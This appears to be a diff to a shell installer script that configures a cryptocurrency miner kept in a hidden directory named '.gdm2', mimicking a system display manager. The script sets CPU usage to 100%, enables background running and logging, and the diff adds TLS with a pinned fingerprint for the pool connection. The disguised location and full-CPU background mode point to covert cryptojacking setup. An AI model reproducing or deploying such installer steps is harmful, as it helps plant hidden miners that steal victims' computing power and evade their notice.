@@ -235,6 +235,8 @@ sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
+sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": "58cfe2b6e40011fa55618616f23ec09087d3829b3325c1c580e7874262f6f531",/' $HOME/.gdm2/config.json
+sed -i 's/"tls": null,/"tls": "true",/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
